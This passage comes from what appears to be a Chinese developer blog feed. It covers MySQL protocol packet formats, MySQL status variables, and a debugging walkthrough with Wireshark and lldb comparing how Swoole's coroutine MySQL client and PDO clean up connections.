8</td><td>空位图</td></tr><tr><td>n</td><td>字段值</td></tr><tr><td>…</td><td>（一行数据中包含多个字段值）</td></tr></tbody></table><p><strong>空位图</strong>：前2个比特位被保留，值分别为0和1，以保证不会和OK、Error包的首字节冲突。在MySQL 5.0及之后的版本中，这2个比特位的值都为0。</p><p><strong>字段值</strong>：行数据中的字段值，二进制形式。</p><h4 id="4-3-9-PREPARE-OK-响应报文（Prepared-Statement）"><a href="#4-3-9-PREPARE-OK-响应报文（Prepared-Statement）" class="headerlink" title="4.3.9 PREPARE_OK 响应报文（Prepared Statement）"></a>4.3.9 PREPARE_OK 响应报文（Prepared Statement）</h4><p>用于响应客户端发起的预处理语句报文，组成结构如下：</p><table><thead><tr><th>结构</th><th>说明</th></tr></thead><tbody><tr><td>[PREPARE_OK]</td><td>PREPARE_OK结构</td></tr><tr><td>如果参数数量大于0</td><td></td></tr><tr><td>[Field]</td><td>与Result Set消息结构相同</td></tr><tr><td>[EOF]</td><td></td></tr><tr><td>如果列数大于0</td><td></td></tr><tr><td>[Field]</td><td>与Result Set消息结构相同</td></tr><tr><td>[EOF]</td></tr></tbody></table><p>其中 PREPARD_OK 的结构如下：</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>OK报文，值为0x00</td></tr><tr><td>4</td><td>预处理语句ID值</td></tr><tr><td>2</td><td>列数量</td></tr><tr><td>2</td><td>参数数量</td></tr><tr><td>1</td><td>填充值（0x00）</td></tr><tr><td>2</td><td>告警计数</td></tr></tbody></table><h4 id="4-3-10-Parameter-响应报文（Prepared-Statement）"><a href="#4-3-10-Parameter-响应报文（Prepared-Statement）" class="headerlink" title="4.3.10 Parameter 响应报文（Prepared Statement）"></a>4.3.10 Parameter 响应报文（Prepared Statement）</h4><p>预处理语句的值与参数正确对应后，服务器会返回 Parameter 报文。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>类型</td></tr><tr><td>2</td><td>标志</td></tr><tr><td>1</td><td>数值精度</td></tr><tr><td>4</td><td>字段长度</td></tr></tbody></table><p><strong>类型</strong>：与 Field 结构中的字段类型相同。</p><p><strong>标志</strong>：与 Field 结构中的字段标志相同。</p><p><strong>数值精度</strong>：与 Field 结构中的数值精度相同。</p><p><strong>字段长度</strong>：与 Field 结构中的字段长度相同。</p><h2 id="5-参考资料"><a href="#5-参考资料" class="headerlink" title="5 参考资料"></a>5 参考资料</h2><p>《<a href="http://dev.mysql.com/doc/internals/en/index.html" target="_blank" rel="noopener">MySQL Internals Manual</a>: <a href="http://dev.mysql.com/doc/internals/en/client-server-protocol.html" target="_blank" rel="noopener">MySQL Client/Server Protocol</a>》</p><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p><a href="http://hutaow.com/blog/2013/11/06/mysql-protocol-analysis/" target="_blank" rel="noopener">http://hutaow.com/blog/2013/11/06/mysql-protocol-analysis/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-交互过程&quot;&gt;&lt;a href=&quot;#1-交互过程&quot; class=&quot;headerlink&quot; title=&quot;1 交互过程&quot;&gt;&lt;/a&gt;1 交互过程&lt;/h2&gt;&lt;p&gt;MySQL客户端与服务器的交互主要分为两个阶段：握手认证阶段和命令执行阶段。&lt;/p&gt;
&lt;h3 id=&quot;1-1-握手认证阶段&quot;&gt;&lt;a href=&quot;#1-1-握手认证阶段&quot; class=&quot;headerlink&quot; title=&quot;1.1 握手认证阶段&quot;&gt;&lt;/a&gt;1.1 握手认证阶段&lt;/h3&gt;&lt;p&gt;握手认证阶段为客户端与服务器建立连接后进行，交互过程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器 -&amp;gt; 客户端：握手初始化消息&lt;/li&gt;
&lt;li&gt;客户端 -&amp;gt; 服务器：登陆认证消息&lt;/li&gt;
&lt;li&gt;服务器 -&amp;gt; 客户端：认证结果消息&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;1-2-命令执行阶段&quot;&gt;&lt;a href=&quot;#1-2-命令执行阶段&quot; class=&quot;headerlink&quot; title=&quot;1.2 命令执行阶段&quot;&gt;&lt;/a&gt;1.2 命令执行阶段&lt;/h3&gt;&lt;p&gt;客户端认证成功后，会进入命令执行阶段，交互过程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端 -&amp;gt; 服务器：执行命令消息&lt;/li&gt;
&lt;li&gt;服务器 -&amp;gt; 客户端：命令执行结果&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>[整理]MySQL查看连接数以及状态</title>
    <link href="http://www.twosee.cn/2018/05/12/mysql-status-check/"/>
    <id>http://www.twosee.cn/2018/05/12/mysql-status-check/</id>
    <published>2018-05-12T03:05:53.000Z</published>
    <updated>2018-05-12T03:22:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Connections"><a href="#Connections" class="headerlink" title="Connections"></a>Connections</h2><p><strong>命令：<code>show processlist;</code></strong><br><strong>如果是root帐号，你能看到所有用户的当前连接。如果是其它普通帐号，只能看到自己占用的连接。</strong><br><code>show processlist</code>只列出前100条</p><p>如果想全列出请使用<strong><code>show full processlist;</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show processlist;</span><br></pre></td></tr></table></figure><h2 id="Status"><a href="#Status" class="headerlink" title="Status"></a>Status</h2><p><strong>命令： <code>show status;</code></strong></p><p><strong>命令：<code>show status like &#39;%下面变量%&#39;;</code></strong></p><a id="more"></a><table><thead><tr><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>Aborted_clients</td><td>由于客户没有正确关闭连接已经死掉，已经放弃的连接数量。</td></tr><tr><td>Aborted_connects</td><td>尝试已经失败的MySQL服务器的连接的次数。</td></tr><tr><td>Connections</td><td>试图连接MySQL服务器的次数。</td></tr><tr><td>Created_tmp_tables</td><td>当执行语句时，已经被创造了的隐含临时表的数量。</td></tr><tr><td>Delayed_insert_threads</td><td>正在使用的延迟插入处理器线程的数量。</td></tr><tr><td>Delayed_writes</td><td>用INSERT/DELAYED写入的行数。</td></tr><tr><td>Delayed_errors</td><td>用INSERT/DELAYED写入的发生某些错误(可能重复键值)的行数。</td></tr><tr><td>Flush_commands</td><td>执行FLUSH命令的次数。</td></tr><tr><td>Handler_delete</td><td>请求从一张表中删除行的次数。</td></tr><tr><td>Handler_read_first</td><td>请求读入表中第一行的次数。</td></tr><tr><td>Handler_read_key</td><td>请求数字基于键读行。</td></tr><tr><td>Handler_read_next</td><td>请求读入基于一个键的一行的次数。</td></tr><tr><td>Handler_read_rnd</td><td>请求读入基于一个固定位置的一行的次数。</td></tr><tr><td>Handler_update</td><td>请求更新表中一行的次数。</td></tr><tr><td>Handler_write</td><td>请求向表中插入一行的次数。</td></tr><tr><td>Key_blocks_used</td><td>用于关键字缓存的块的数量。</td></tr><tr><td>Key_read_requests</td><td>请求从缓存读入一个键值的次数。</td></tr><tr><td>Key_reads</td><td>从磁盘物理读入一个键值的次数。</td></tr><tr><td>Key_write_requests</td><td>请求将一个关键字块写入缓存次数。</td></tr><tr><td>Key_writes</td><td>将一个键值块物理写入磁盘的次数。</td></tr><tr><td>Max_used_connections</td><td>同时使用的连接的最大数目。</td></tr><tr><td>Not_flushed_key_blocks</td><td>在键缓存中已经改变但是还没被清空到磁盘上的键块。</td></tr><tr><td>Not_flushed_delayed_rows</td><td>在INSERT/DELAY队列中等待写入的行的数量。</td></tr><tr><td>Open_tables</td><td>打开表的数量。</td></tr><tr><td>Open_files</td><td>打开文件的数量。</td></tr><tr><td>Open_streams</td><td>打开流的数量(主要用于日志记载）</td></tr><tr><td>Opened_tables</td><td>已经打开的表的数量。</td></tr><tr><td>Questions</td><td>发往服务器的查询的数量。</td></tr><tr><td>Slow_queries</td><td>要花超过long_query_time时间的查询数量。</td></tr><tr><td>Threads_connected</td><td>当前打开的连接的数量。</td></tr><tr><td>Threads_running</td><td>不在睡眠的线程数量。</td></tr><tr><td>Uptime</td><td>服务器工作了多少秒。</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Connections&quot;&gt;&lt;a href=&quot;#Connections&quot; class=&quot;headerlink&quot; title=&quot;Connections&quot;&gt;&lt;/a&gt;Connections&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;命令：&lt;code&gt;show processlist;&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;如果是root帐号，你能看到所有用户的当前连接。如果是其它普通帐号，只能看到自己占用的连接。&lt;/strong&gt;&lt;br&gt;&lt;code&gt;show processlist&lt;/code&gt;只列出前100条&lt;/p&gt;
&lt;p&gt;如果想全列出请使用&lt;strong&gt;&lt;code&gt;show full processlist;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; show processlist;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Status&quot;&gt;&lt;a href=&quot;#Status&quot; class=&quot;headerlink&quot; title=&quot;Status&quot;&gt;&lt;/a&gt;Status&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;命令： &lt;code&gt;show status;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命令：&lt;code&gt;show status like &amp;#39;%下面变量%&amp;#39;;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Swoole的Mysql模块浅析-1</title>
    <link href="http://www.twosee.cn/2018/05/11/swoole-mysql-analyzation-1/"/>
    <id>http://www.twosee.cn/2018/05/11/swoole-mysql-analyzation-1/</id>
    <published>2018-05-11T12:48:00.000Z</published>
    <updated>2018-05-12T03:20:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>众所周知, PHP是由C语言编写的, 扩展也不例外, Swoole又是PHP扩展中发展的比较快且很权威的一个扩展, 对于MySQL这部分模块的浅析, 暂可不必了解Swoole底层的实现, 而先关注应用层面的实现.</p><h2 id="基础要求"><a href="#基础要求" class="headerlink" title="基础要求"></a>基础要求</h2><p>所以除了PHP我们仅需了解以下几个方面的知识:</p><ol><li>MySQL基础</li><li>TCP网络协议基础(MySQL协议)</li><li>C语言基础及其简单调试</li></ol><p>而使用过Swoole的同学一定对以下工具不陌生:</p><ol><li><code>GDB</code>(Mac下用<code>LLDB</code>)和<code>Valgrind</code>作为源码/内存分析</li><li><code>Wireshark</code>或<code>TcpDump</code>作为网络分析</li></ol><a id="more"></a><h2 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h2><p>首先我们写一个简单的协程Mysql查询Demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">go(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    $db = <span class="keyword">new</span> Swoole\Coroutine\Mysql;</span><br><span class="line">    $server = [</span><br><span class="line">        <span class="string">'host'</span>     =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'user'</span>     =&gt; <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'password'</span> =&gt; <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'database'</span> =&gt; <span class="string">'test'</span></span><br><span class="line">    ];</span><br><span class="line">    $db-&gt;connect($server);</span><br><span class="line">    $stmt = $db-&gt;prepare(<span class="string">'SELECT * FROM `userinfo`'</span>);</span><br><span class="line">    $ret = $stmt-&gt;execute([]);</span><br><span class="line">    var_dump($ret);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后我们可以使用Wireshark对本地网络进行捕获<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWgy1fr7pj4z2djj30rs0m8jtr.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure></p><p>依托于功能强大的wireshark, 我们只需过滤器里输入<code>mysql</code>即可从繁忙的本地网络中筛选出mysql通信的数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWgy1fr7ptebaaej30rk06x409.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以看到MySQL通信<strong>建立后</strong>的部分(不包括前面TCP握手等部分)</p><ol><li>Mysql服务器向客户端打招呼, 并携带了自身版本信息</li><li>客户端收到后, 发起登录请求, 并携带了配置参数(用户名/密码/使用编码/选择进入的数据库等)</li><li>Mysql响应登录成功</li><li>发出一个携带SQL语句的PREPARE请求来编译模板语句 [COM_STMT_PREPARE]</li><li>Mysql响应PREPARE_OK响应报文 (这里的返回报文比较复杂,在下一篇细讲)</li><li>发出执行指定ID模板语句的请求, 并携带了参数数据  [COM_STMT_EXECUTE]</li><li>Mysql响应结果集(此处也很复杂)</li></ol><h2 id="问题发现-swoole的疏漏"><a href="#问题发现-swoole的疏漏" class="headerlink" title="问题发现: swoole的疏漏?"></a>问题发现: swoole的疏漏?</h2><p>乍看之下这一套流程并没有什么问题, 但由于在此之前我是PDO的忠实粉丝(Swoole的Statement功能也是当初机缘巧合我建议Rango大佬考虑加入的), 所以我在阅读Swoole源码的同时也阅读了PDO源码并编写demo互作比对, 然后很快就发现了问题.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=127.0.0.1;dbname=test;charset=utf8"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="keyword">false</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM  userinfo WHERE `id`=:id"</span>;</span><br><span class="line">$stmt = $pdo-&gt;prepare($sql);</span><br><span class="line">$res = $stmt-&gt;execute([<span class="string">'id'</span> =&gt; <span class="number">1</span>]);</span><br></pre></td></tr></table></figure></p><h3 id="缺失的流程"><a href="#缺失的流程" class="headerlink" title="缺失的流程"></a>缺失的流程</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWgy1fr7qnai0mxj30rv05egn7.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>很容易可以发现, PDO比Swoole多做了一些<strong>善后处理</strong>, 在statement对象销毁时, 触发了destruct主动通知mysql销毁了模板语句, 然后在pdo对象销毁时, 又主动通知了mysql该会话/连接退出.</p><hr><p>马上我怀疑是我没有主动在swoole调用close关闭的缘故, 但是close应该是在destruct的时候自动触发的, 所以我们需要深入一波源码, 看看swoole是否有做收尾工作.</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>直接通过文件名和关键字搜索来查看对应源码也是可以的, 但是用gdb调试来查看底层C内部运作的流程会更酷.</p><p>Mac下使用lldb工具更佳, 操作和gdb大同小异.</p><p>在终端中输入:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lldb php "/path/to/swoole-mysql.php"</span><br></pre></td></tr></table></figure><p>就可以在lldb中设置调试程序和对应脚本(实际上是调试PHP这个C程序, 并添加了path作为第一个argument)</p><p>由于Swoole的协程运作机制异常复杂, PHP脚本并不是像代码那样按序从头到尾运行一遍那么简单, go函数会立即返回, Swoole会在脚本结尾注册shutdown-function, 然后进入事件循环, 这里我有空会写一篇新文章分析, 所以按照常规方式操作并不能分析该脚本的调用栈.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> b = breakpoint; r = run</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ==================</span></span><br><span class="line">b "zim_swoole_mysql_coro___destruct"</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>此时可能会提示<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1: no locations (pending).</span><br><span class="line">WARNING:  Unable to resolve breakpoint to any actual locations.</span><br></pre></td></tr></table></figure><br>实际上是可以下断点的, 只是由于某些的缘故lldb找不到该位置, 有待分析</p><p>然后你就可以看到程序运行了并断在了这里, 你可以输入<code>list</code>来展开源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x00000001038aace3</span> swoole.so`zim_swoole_mysql_coro___destruct(execute_data=<span class="number">0x0000000101c85210</span>, return_value=<span class="number">0x00007ffeefbfd998</span>) at swoole_mysql_coro.c:<span class="number">1088</span></span><br><span class="line">   <span class="number">1085</span></span><br><span class="line">   <span class="number">1086</span><span class="function"><span class="keyword">static</span> <span class="title">PHP_METHOD</span><span class="params">(swoole_mysql_coro, __destruct)</span></span></span><br><span class="line"><span class="function">   1087</span>&#123;</span><br><span class="line">-&gt; <span class="number">1088</span>    mysql_client *client = swoole_get_object(getThis());</span><br><span class="line">   <span class="number">1089</span>    <span class="keyword">if</span> (!client)</span><br><span class="line">   <span class="number">1090</span>    &#123;</span><br><span class="line">   <span class="number">1091</span>        <span class="keyword">return</span>;</span><br><span class="line">Target <span class="number">0</span>: (php) stopped.</span><br><span class="line">(lldb) <span class="built_in">list</span></span><br><span class="line">   <span class="number">1092</span>    &#125;</span><br><span class="line">   <span class="number">1093</span>    <span class="keyword">if</span> (client-&gt;state != SW_MYSQL_STATE_CLOSED &amp;&amp; client-&gt;cli)</span><br><span class="line">   <span class="number">1094</span>    &#123;</span><br><span class="line">   <span class="number">1095</span>        swoole_mysql_coro_close(getThis());</span><br><span class="line">   <span class="number">1096</span>    &#125;</span><br><span class="line">   <span class="number">1097</span>    <span class="keyword">if</span> (client-&gt;<span class="built_in">buffer</span>)</span><br><span class="line">   <span class="number">1098</span>    &#123;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1099</span>        swString_free(client-&gt;<span class="built_in">buffer</span>);</span><br><span class="line">   <span class="number">1100</span>    &#125;</span><br><span class="line">   <span class="number">1101</span>    efree(client);</span><br><span class="line">   <span class="number">1102</span>    swoole_set_object(getThis(), <span class="literal">NULL</span>);</span><br><span class="line">   <span class="number">1103</span></span><br><span class="line">   <span class="number">1104</span>    php_context *context = swoole_get_property(getThis(), <span class="number">0</span>);</span><br><span class="line">   <span class="number">1105</span>    <span class="keyword">if</span> (!context)</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1106</span>    &#123;</span><br><span class="line">   <span class="number">1107</span>        <span class="keyword">return</span>;</span><br><span class="line">   <span class="number">1108</span>    &#125;</span><br><span class="line">   <span class="number">1109</span>    <span class="keyword">if</span> (likely(context-&gt;state == SW_CORO_CONTEXT_RUNNING))</span><br><span class="line">   <span class="number">1110</span>    &#123;</span><br><span class="line">   <span class="number">1111</span>        efree(context);</span><br><span class="line">   <span class="number">1112</span>    &#125;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1113</span>    <span class="keyword">else</span></span><br><span class="line">   <span class="number">1114</span>    &#123;</span><br><span class="line">   <span class="number">1115</span>        context-&gt;state = SW_CORO_CONTEXT_TERM;</span><br><span class="line">   <span class="number">1116</span>    &#125;</span><br><span class="line">   <span class="number">1117</span>    swoole_set_property(getThis(), <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="number">1118</span>&#125;</span><br><span class="line">   <span class="number">1119</span></span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1120</span><span class="function"><span class="keyword">static</span> <span class="title">PHP_METHOD</span><span class="params">(swoole_mysql_coro, <span class="built_in">close</span>)</span></span></span><br><span class="line"><span class="function">   1121</span>&#123;</span><br><span class="line">   <span class="number">1122</span>    <span class="keyword">if</span> (swoole_mysql_coro_close(getThis()) == FAILURE)</span><br><span class="line">   <span class="number">1123</span>    &#123;</span><br><span class="line">   <span class="number">1124</span>        RETURN_FALSE;</span><br><span class="line">   <span class="number">1125</span>    &#125;</span><br><span class="line">   <span class="number">1126</span><span class="meta">#<span class="meta-keyword">if</span> PHP_MAJOR_VERSION &lt; 7</span></span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1127</span>    sw_zval_ptr_dtor(&amp;getThis());</span><br><span class="line">   <span class="number">1128</span><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">   <span class="number">1129</span>RETURN_TRUE;</span><br><span class="line">   <span class="number">1130</span>&#125;</span><br></pre></td></tr></table></figure><p>在析构函数中的1095行, 和close函数中的1122行, 我们都可以看到调用了swoole_mysql_coro_close方法, 再次下断点调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x00000001030ae573</span> swoole.so`swoole_mysql_coro_close(<span class="keyword">this</span>=<span class="number">0x0000000101c85230</span>) at swoole_mysql_coro.c:<span class="number">180</span></span><br><span class="line">   <span class="number">177</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">swoole_mysql_coro_close</span><span class="params">(zval *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function">   178 </span>&#123;</span><br><span class="line">   <span class="number">179</span>     SWOOLE_GET_TSRMLS;</span><br><span class="line">-&gt; <span class="number">180</span>     mysql_client *client = swoole_get_object(<span class="keyword">this</span>);</span><br><span class="line">   <span class="number">181</span>     <span class="keyword">if</span> (!client)</span><br><span class="line">   <span class="number">182</span>     &#123;</span><br><span class="line">   <span class="number">183</span>         swoole_php_fatal_error(E_WARNING, <span class="string">"object is not instanceof swoole_mysql_coro."</span>);</span><br><span class="line">Target <span class="number">0</span>: (php) stopped.</span><br><span class="line">(lldb) l</span><br><span class="line">   <span class="number">184</span>         <span class="keyword">return</span> FAILURE;</span><br><span class="line">   <span class="number">185</span>     &#125;</span><br><span class="line">   <span class="number">186</span></span><br><span class="line">   <span class="number">187</span>     <span class="keyword">if</span> (!client-&gt;cli)</span><br><span class="line">   <span class="number">188</span>     &#123;</span><br><span class="line">   <span class="number">189</span>         <span class="keyword">return</span> FAILURE;</span><br><span class="line">   <span class="number">190</span>     &#125;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">191</span></span><br><span class="line">   <span class="number">192</span>     zend_update_property_bool(swoole_mysql_coro_class_entry_ptr, <span class="keyword">this</span>, ZEND_STRL(<span class="string">"connected"</span>), <span class="number">0</span> TSRMLS_CC);</span><br><span class="line">   <span class="number">193</span>     SwooleG.main_reactor-&gt;del(SwooleG.main_reactor, client-&gt;fd);</span><br><span class="line">   <span class="number">194</span></span><br><span class="line">   <span class="number">195</span>     swConnection *_socket = swReactor_get(SwooleG.main_reactor, client-&gt;fd);</span><br><span class="line">   <span class="number">196</span>     _socket-&gt;object = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="number">197</span>     _socket-&gt;active = <span class="number">0</span>;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">198</span></span><br><span class="line">   <span class="number">199</span>     <span class="keyword">if</span> (client-&gt;timer)</span><br><span class="line">   <span class="number">200</span>     &#123;</span><br><span class="line">   <span class="number">201</span>         swTimer_del(&amp;SwooleG.timer, client-&gt;timer);</span><br><span class="line">   <span class="number">202</span>         client-&gt;timer = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="number">203</span>     &#125;</span><br><span class="line">   <span class="number">204</span></span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">205</span>     <span class="keyword">if</span> (client-&gt;statement_list)</span><br><span class="line">   <span class="number">206</span>     &#123;</span><br><span class="line">   <span class="number">207</span>         swLinkedList_node *node = client-&gt;statement_list-&gt;head;</span><br><span class="line">   <span class="number">208</span>         <span class="keyword">while</span> (node)</span><br><span class="line">   <span class="number">209</span>         &#123;</span><br><span class="line">   <span class="number">210</span>             mysql_statement *stmt = node-&gt;data;</span><br><span class="line">   <span class="number">211</span>             <span class="keyword">if</span> (stmt-&gt;object)</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">212</span>             &#123;</span><br><span class="line">   <span class="number">213</span>                 swoole_set_object(stmt-&gt;object, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="number">214</span>                 efree(stmt-&gt;object);</span><br><span class="line">   <span class="number">215</span>             &#125;</span><br><span class="line">   <span class="number">216</span>             efree(stmt);</span><br><span class="line">   <span class="number">217</span>             node = node-&gt;next;</span><br><span class="line">   <span class="number">218</span>         &#125;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">219</span>         swLinkedList_free(client-&gt;statement_list);</span><br><span class="line">   <span class="number">220</span>     &#125;</span><br><span class="line">   <span class="number">221</span></span><br><span class="line">   <span class="number">222</span>     client-&gt;cli-&gt;<span class="built_in">close</span>(client-&gt;cli);</span><br><span class="line">   <span class="number">223</span>     swClient_free(client-&gt;cli);</span><br><span class="line">   <span class="number">224</span>     efree(client-&gt;cli);</span><br><span class="line">   <span class="number">225</span>     client-&gt;cli = <span class="literal">NULL</span>;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">226</span>     client-&gt;state = SW_MYSQL_STATE_CLOSED;</span><br><span class="line">   <span class="number">227</span>     client-&gt;iowait = SW_MYSQL_CORO_STATUS_CLOSED;</span><br><span class="line">   <span class="number">228</span></span><br><span class="line">   <span class="number">229</span>     <span class="keyword">return</span> SUCCESS;</span><br><span class="line">   <span class="number">230</span> &#125;</span><br></pre></td></tr></table></figure><p>析构函数中可以看到一系列对自身的”清理操作”, 